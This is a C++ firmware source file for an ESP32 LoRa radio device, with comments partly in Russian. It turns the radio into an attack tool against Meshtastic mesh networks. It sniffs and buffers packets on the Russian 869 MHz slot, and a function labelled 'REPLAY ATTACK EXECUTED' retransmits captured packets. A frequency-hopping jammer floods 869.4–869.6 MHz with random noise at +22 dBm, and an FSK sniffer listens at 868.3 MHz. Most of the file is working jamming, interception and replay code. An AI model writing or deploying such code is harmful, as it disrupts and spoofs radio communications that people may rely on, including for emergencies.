#include "LoraManager.h"
#include <string.h>

// Meshtastic default sync word (868 MHz EU)
#define MESHTASTIC_SYNC_WORD 0x2B

// Meshtastic Russia frequency slots (868 MHz)
#define MESHTASTIC_RUSSIA_FREQ_SLOT_0 869.075f
#define MESHTASTIC_RUSSIA_FREQ_SLOT_2                                          \
  869.075f // Same frequency for slot 2 (can be adjusted if needed)

LoraManager::LoraManager()
    : mod_(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY), radio_(&mod_),
      currentFreqSlot_(0) {
  memset(rssiHistory_, 0, sizeof(rssiHistory_));
}

void LoraManager::begin() {
  // Hardware init is deferred until setMode(true) to save power
}

void LoraManager::setMode(bool active) {
  if (!active) {
    stopJamming();
    stopSense();
    active_ = false;
    isReceiving_ = false;
    // Optimized: ensure deep sleep for power saving when not in use
    int sleepState = radio_.sleep();
    if (sleepState != RADIOLIB_ERR_NONE) {
      Serial.printf("[LORA] Sleep failed, code %d, forcing reset\n",
                    sleepState);
      // Force sleep by resetting radio
      radio_.reset();
      radio_.sleep();
    } else {
      Serial.println("[LORA] Deep sleep mode (power saving)");
    }
    return;
  }

  // Остановить другие режимы перед запуском SNIFF
  if (isJamming_) {
    stopJamming();
  }
  if (isSensing_) {
    stopSense();
  }

  active_ = true;
  Serial.println("[LORA] Powering UP SX1262 (SIGINT)...");
  // Meshtastic Russia: 869.075 MHz (slot 0 or 2), BW 250 kHz, SF 11, CR 5,
  // SyncWord 0x2B Long Range Fast preset
  float freq = (currentFreqSlot_ == 0) ? MESHTASTIC_RUSSIA_FREQ_SLOT_0
                                       : MESHTASTIC_RUSSIA_FREQ_SLOT_2;
  int state = radio_.begin(freq, 250.0f, 11, 5, MESHTASTIC_SYNC_WORD, 22, 8);
  if (state == RADIOLIB_ERR_NONE) {
    int rxState = radio_.startReceive();
    if (rxState == RADIOLIB_ERR_NONE) {
      isReceiving_ = true;
      Serial.printf(
          "[LORA] Meshtastic sniffer ready (Russia, slot %d, %.3f MHz).\n",
          currentFreqSlot_, freq);
    } else {
      Serial.printf("[LORA] startReceive failed, code %d\n", rxState);
      isReceiving_ = false;
      active_ = false;
      radio_.sleep();
    }
  } else {
    Serial.printf("[LORA] Init Failed, code %d\n", state);
    isReceiving_ = false;
    active_ = false;
  }
}

static const float JAM_FREQS[] = {869.4f, 869.5f, 869.6f};
static const int JAM_FREQ_COUNT = 3;
#define LORA_JAM_POWER 22

void LoraManager::startJamming(float centerFreq) {
  if (isJamming_)
    return;

  // Остановить другие режимы перед запуском JAM
  // Optimized: check if radio is already sleeping before switching modes
  if (active_ && !isJamming_) {
    setMode(false);
    // Minimal delay only if radio was active (sleep takes ~10ms)
    yield(); // Allow other tasks to run
  }
  if (isSensing_) {
    stopSense();
    yield(); // Allow other tasks to run
  }

  Serial.println("[SILENCE] Starting 868 MHz jammer (+22 dBm)...");
  int state = radio_.begin(869.5f, 250.0f, 11, 5, MESHTASTIC_SYNC_WORD, 22, 8);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[SILENCE] Init failed %d\n", state);
    active_ = false;
    isJamming_ = false;
    return;
  }

  int powerState = radio_.setOutputPower(jamPower_);
  if (powerState != RADIOLIB_ERR_NONE) {
    Serial.printf("[SILENCE] setOutputPower failed %d\n", powerState);
    radio_.sleep();
    active_ = false;
    isJamming_ = false;
    return;
  }

  active_ = true;
  isJamming_ = true;
  isReceiving_ = false;
  jamHopIndex_ = 0;
  Serial.println("[SILENCE] Jammer ACTIVE");
}

void LoraManager::stopJamming() {
  if (!isJamming_)
    return;
  isJamming_ = false;
  // Optimized: ensure deep sleep for power saving
  int sleepState = radio_.sleep();
  if (sleepState != RADIOLIB_ERR_NONE) {
    Serial.printf("[SILENCE] Sleep failed %d\n", sleepState);
    // Try to force sleep by resetting
    radio_.reset();
    radio_.sleep();
  } else {
    Serial.println("[SILENCE] Jammer OFF (deep sleep).");
  }
  if (!isSensing_ && !active_) {
    active_ = false;
  }
}

void LoraManager::setJamPower(int8_t power) {
  jamPower_ = constrain(power, 0, 22);
  if (isJamming_) {
    // Обновить мощность на лету, если джеммер активен
    int powerState = radio_.setOutputPower(jamPower_);
    if (powerState != RADIOLIB_ERR_NONE) {
      Serial.printf("[SILENCE] Failed to update power %d\n", powerState);
    }
  }
}

void LoraManager::captureAndStore(const uint8_t *rawData, size_t len,
                                  float rssi, float snr) {
  // Валидация параметров
  if (rawData == nullptr || len == 0 || len > LORA_RAW_PACKET_MAX) {
    Serial.printf("[LORA] Invalid packet data: len=%d\n", len);
    return;
  }

  // Фильтрация по адресу, если установлена
  if (filterAddress_ != 0 && len >= 4) {
    uint32_t fromId = (uint32_t)rawData[0] | ((uint32_t)rawData[1] << 8) |
                      ((uint32_t)rawData[2] << 16) |
                      ((uint32_t)rawData[3] << 24);
    if (fromId != filterAddress_) {
      // Пакет не соответствует фильтру, игнорируем
      return;
    }
  }

  lastPacket_.rssi = rssi;
  lastPacket_.snr = snr;
  lastPacket_.timestamp = millis();
  packetCount_++;

  // Optimized: формирование hex строки с использованием статического буфера
  static char hexBuf[LORA_RAW_PACKET_MAX * 3 +
                     1]; // Max size: 256 bytes * 3 chars + null
  hexBuf[0] = '\0';
  for (size_t i = 0; i < len && i < LORA_RAW_PACKET_MAX; i++) {
    char cbuf[4];
    snprintf(cbuf, sizeof(cbuf), "%02X ", (unsigned)rawData[i]);
    strncat(hexBuf, cbuf, sizeof(hexBuf) - strlen(hexBuf) - 1);
  }
  lastPacket_.data =
      String(hexBuf); // Keep String for compatibility with existing code

  // Сохранение последнего пакета для replay
  lastPacketRawLen_ = len < LORA_RAW_PACKET_MAX ? len : LORA_RAW_PACKET_MAX;
  memcpy(lastPacketRaw_, rawData, lastPacketRawLen_);

  // Добавление в циклический буфер
  int idx = packetBufferHead_ % LORA_PACKET_BUF_SIZE;
  packetBuffer_[idx].len = lastPacketRawLen_;
  packetBuffer_[idx].rssi = rssi;
  packetBuffer_[idx].snr = snr;
  packetBuffer_[idx].timestamp = lastPacket_.timestamp;
  memcpy(packetBuffer_[idx].data, rawData, packetBuffer_[idx].len);

  packetBufferHead_++;
  if (packetBufferCount_ < LORA_PACKET_BUF_SIZE)
    packetBufferCount_++;
  else {
    // Буфер переполнен - старые пакеты автоматически перезаписываются
    Serial.println("[LORA] Packet buffer full, overwriting oldest");
  }
}

void LoraManager::replayLast() {
  if (lastPacketRawLen_ == 0) {
    Serial.println("[HACK] No packet to replay");
    return;
  }
  if (!active_ || isJamming_ || isSensing_) {
    Serial.println("[HACK] Radio not in SNIFF mode");
    return;
  }

  // Переключение в режим передачи
  int txState = radio_.transmit(lastPacketRaw_, lastPacketRawLen_);
  if (txState == RADIOLIB_ERR_NONE) {
    Serial.println("[HACK] REPLAY ATTACK EXECUTED");
  } else {
    Serial.printf("[HACK] Replay failed %d\n", txState);
  }

  // Возврат в режим приема
  int rxState = radio_.startReceive();
  if (rxState != RADIOLIB_ERR_NONE) {
    Serial.printf("[HACK] Failed to resume receive %d\n", rxState);
    // Попытка переинициализации (optimized: minimal delay)
    setMode(false);
    yield(); // Allow other tasks to run
    setMode(true);
  }
}

void LoraManager::clearBuffer() {
  packetBufferCount_ = 0;
  packetBufferHead_ = 0;
  lastPacketRawLen_ = 0;
  lastPacket_.data = "";
  lastPacket_.rssi = 0;
  lastPacket_.snr = 0;
  packetCount_ = 0;
  Serial.println("[LORA] Buffer cleared.");
}

void LoraManager::setFilterAddress(uint32_t addr) {
  filterAddress_ = addr;
  if (addr != 0) {
    Serial.printf("[LORA] Filter set to address: 0x%lX\n", (unsigned long)addr);
  } else {
    Serial.println("[LORA] Filter disabled");
  }
}

void LoraManager::switchFreqSlot() {
  if (!active_ || !isReceiving_)
    return;

  currentFreqSlot_ = (currentFreqSlot_ == 0) ? 2 : 0;
  float newFreq = (currentFreqSlot_ == 0) ? MESHTASTIC_RUSSIA_FREQ_SLOT_0
                                          : MESHTASTIC_RUSSIA_FREQ_SLOT_2;

  // Переинициализация с новой частотой (optimized: minimal delay)
  setMode(false);
  yield(); // Allow other tasks to run
  setMode(true);

  Serial.printf("[LORA] Switched to frequency slot %d (%.3f MHz)\n",
                currentFreqSlot_, newFreq);
}

const int8_t *LoraManager::getRssiHistory(int &outLen) const {
  outLen = rssiHistoryCount_;
  return rssiHistory_;
}

const LoraRawPacket *LoraManager::getPacketInBuffer(int index) const {
  if (index < 0 || index >= packetBufferCount_)
    return nullptr;
  int idx = (packetBufferHead_ - 1 - index + LORA_PACKET_BUF_SIZE) %
            LORA_PACKET_BUF_SIZE;
  return &packetBuffer_[idx];
}

#define SENSE_FREQ_MHZ 868.3f
#define SENSE_BITRATE 9.6f
#define SENSE_FREQ_DEV 25.0f
#define SENSE_RX_BW 100.0f

void LoraManager::startSense() {
  if (isSensing_)
    return;

  // Остановить другие режимы перед запуском SENSE (optimized: minimal delay)
  if (active_ && !isSensing_) {
    setMode(false);
    yield(); // Allow other tasks to run
  }
  if (isJamming_) {
    stopJamming();
    yield(); // Allow other tasks to run
  }

  Serial.println("[GHOSTS] FSK 868.3 MHz sniffer...");
  int state = radio_.beginFSK(SENSE_FREQ_MHZ, SENSE_BITRATE, SENSE_FREQ_DEV,
                              SENSE_RX_BW, 10, 8);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("[GHOSTS] beginFSK failed %d\n", state);
    active_ = false;
    isSensing_ = false;
    return;
  }

  // Настройка preamble length для лучшего обнаружения пакетов
  int preambleState = radio_.setPreambleLength(16);
  if (preambleState != RADIOLIB_ERR_NONE) {
    Serial.printf("[GHOSTS] setPreambleLength failed %d (non-critical)\n",
                  preambleState);
  }

  int rxState = radio_.startReceive();
  if (rxState != RADIOLIB_ERR_NONE) {
    Serial.printf("[GHOSTS] startReceive failed %d\n", rxState);
    radio_.sleep();
    active_ = false;
    isSensing_ = false;
    return;
  }

  active_ = true;
  isSensing_ = true;
  isReceiving_ = false;
  senseHead_ = 0;
  senseCount_ = 0;
  memset(senseEntries_, 0, sizeof(senseEntries_));
  Serial.println("[GHOSTS] Sense ACTIVE");
}

void LoraManager::stopSense() {
  if (!isSensing_)
    return;
  isSensing_ = false;
  int sleepState = radio_.sleep();
  if (sleepState != RADIOLIB_ERR_NONE) {
    Serial.printf("[GHOSTS] Sleep failed %d\n", sleepState);
  } else {
    Serial.println("[GHOSTS] Sense OFF.");
  }
  if (!isJamming_ && !active_) {
    active_ = false;
  }
}

const LoraManager::SenseEntry *LoraManager::getSenseEntry(int index) const {
  if (index < 0 || index >= senseCount_)
    return nullptr;
  int i = (senseHead_ - 1 - index + SENSE_ENTRIES) % SENSE_ENTRIES;
  if (i < 0)
    i += SENSE_ENTRIES;
  return &senseEntries_[i];
}

void LoraManager::tick() {
  if (!active_)
    return;

  if (isSensing_) {
    // Проверка доступности данных перед чтением
    // RadioLib для FSK может не иметь available(), поэтому проверяем через
    // readData но сначала проверяем, есть ли данные для чтения через RSSI или
    // другие методы

    // Попытка чтения данных (readData вернет ошибку, если данных нет)
    uint8_t buf[64];
    int state = radio_.readData(buf, sizeof(buf));

    if (state == RADIOLIB_ERR_NONE) {
      size_t len = radio_.getPacketLength();
      if (len > sizeof(buf))
        len = sizeof(buf);
      if (len == 0) {
        radio_.startReceive();
        return;
      }

      float rssi = radio_.getRSSI();
      int idx = senseHead_ % SENSE_ENTRIES;
      senseEntries_[idx].rssi = rssi;
      senseEntries_[idx].hex[0] = '\0';
      size_t off = 0;
      for (size_t i = 0; i < len && off < sizeof(senseEntries_[idx].hex) - 3;
           i++) {
        int n = snprintf(senseEntries_[idx].hex + off,
                         sizeof(senseEntries_[idx].hex) - off, "%02X ",
                         (unsigned)buf[i]);
        if (n > 0 && n < (int)(sizeof(senseEntries_[idx].hex) - off))
          off += (size_t)n;
        else
          break;
      }
      senseHead_++;
      if (senseCount_ < SENSE_ENTRIES)
        senseCount_++;

      int rxState = radio_.startReceive();
      if (rxState != RADIOLIB_ERR_NONE) {
        Serial.printf("[GHOSTS] startReceive failed %d\n", rxState);
      }
    } else if (state == RADIOLIB_ERR_RX_TIMEOUT) {
      // Таймаут - это нормально, продолжаем слушать
      // Проверяем, что радио все еще в режиме приема
      // Не нужно перезапускать прием при таймауте, но проверяем состояние
      return;
    } else if (state == RADIOLIB_ERR_CRC_MISMATCH) {
      // CRC ошибка - пакет поврежден, но продолжаем слушать
      int rxState = radio_.startReceive();
      if (rxState != RADIOLIB_ERR_NONE) {
        Serial.printf("[GHOSTS] Failed to resume after CRC error %d\n",
                      rxState);
      }
      return;
    } else {
      // Другие ошибки - попытка восстановления
      Serial.printf("[GHOSTS] readData error %d, attempting recovery...\n",
                    state);
      int rxState = radio_.startReceive();
      if (rxState != RADIOLIB_ERR_NONE) {
        Serial.printf("[GHOSTS] Error recovery failed %d, reinitializing...\n",
                      rxState);
        // Критическая ошибка - переинициализация (optimized: reduced delay)
        stopSense();
        yield(); // Allow other tasks to run
        startSense();
      }
    }
    return;
  }

  if (isJamming_) {
    float freq = JAM_FREQS[jamHopIndex_ % JAM_FREQ_COUNT];
    int freqState = radio_.setFrequency(freq);
    if (freqState != RADIOLIB_ERR_NONE) {
      Serial.printf("[SILENCE] setFrequency failed %d\n", freqState);
      return;
    }

    // Генерация случайного шума
    for (size_t i = 0; i < sizeof(jamBuf_); i++)
      jamBuf_[i] = (uint8_t)(esp_random() & 0xFF);

    int txState = radio_.transmit(jamBuf_, sizeof(jamBuf_));
    if (txState != RADIOLIB_ERR_NONE) {
      Serial.printf("[SILENCE] transmit failed %d\n", txState);
      // Попытка восстановления при критических ошибках
      if (txState < 0) { // Отрицательные коды - ошибки
        Serial.println("[SILENCE] Attempting radio reset...");
        stopJamming();
        yield(); // Allow other tasks to run
        startJamming(869.5f);
      }
      return;
    }
    jamHopIndex_++;
    return;
  }

  unsigned long now = millis();

  // 1. Spectrum monitor: RSSI sample every 100ms
  if (now - lastRssiSampleMs_ >= 100) {
    lastRssiSampleMs_ = now;
    int rssiVal = (int)radio_.getRSSI();
    if (rssiVal >= -128 && rssiVal <= 127) {
      rssiHistory_[rssiHistoryHead_] = (int8_t)rssiVal;
      rssiHistoryHead_ = (rssiHistoryHead_ + 1) % LORA_RSSI_HISTORY_LEN;
      if (rssiHistoryCount_ < LORA_RSSI_HISTORY_LEN)
        rssiHistoryCount_++;
    }
    currentRSSI_ = (float)rssiVal;
    lastUpdate_ = now;
  }

  // 2. Check for packet
  uint8_t buf[LORA_RAW_PACKET_MAX];
  int state = radio_.readData(buf, sizeof(buf));

  if (state == RADIOLIB_ERR_NONE) {
    size_t len = radio_.getPacketLength();
    if (len == 0 || len > sizeof(buf)) {
      Serial.printf("[LORA] Invalid packet length: %d\n", len);
      int rxState = radio_.startReceive();
      if (rxState != RADIOLIB_ERR_NONE) {
        Serial.printf("[LORA] startReceive failed %d\n", rxState);
      }
      return;
    }

    Serial.println("[LORA] PACKET CAPTURED!");
    float rssi = radio_.getRSSI();
    float snr = radio_.getSNR();
    captureAndStore(buf, len, rssi, snr);

    int rxState = radio_.startReceive();
    if (rxState != RADIOLIB_ERR_NONE) {
      Serial.printf("[LORA] startReceive failed %d\n", rxState);
      // Попытка восстановления при критических ошибках
      if (rxState < 0) { // Отрицательные коды - ошибки
        Serial.println("[LORA] Attempting radio reset...");
        setMode(false);
        yield(); // Allow other tasks to run
        setMode(true);
      }
    }
  } else if (state != RADIOLIB_ERR_RX_TIMEOUT &&
             state != RADIOLIB_ERR_CRC_MISMATCH) {
    // Восстановление приема при ошибках (кроме таймаута и CRC)
    Serial.printf("[LORA] readData error %d, recovering...\n", state);
    int rxState = radio_.startReceive();
    if (rxState != RADIOLIB_ERR_NONE) {
      Serial.printf("[LORA] Recovery failed %d\n", rxState);
    }
  }
}
